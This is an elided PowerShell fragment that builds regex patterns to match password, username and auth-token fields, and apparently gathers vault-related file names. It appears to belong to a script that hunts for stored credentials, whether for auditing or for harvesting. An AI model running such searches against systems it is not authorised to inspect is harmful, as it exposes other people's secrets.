...
If($String -Match '(0\)n\.\{0,2\}\(=|:\)\.\[\^\$\]\{0,22\}\$\))$')
{
   ...
   $String = "$String" + "|((cp|p)ass.{0,4}`":.{0,22}$)|(`"(Pass.{1,5}|User.{1,4})`">)|(Username`":.{0,22}$)|(`"Auth_token`":)" -join ''
}
...
ForEach($Entry in $VaultCmd){$FileNames += "$Entry"}
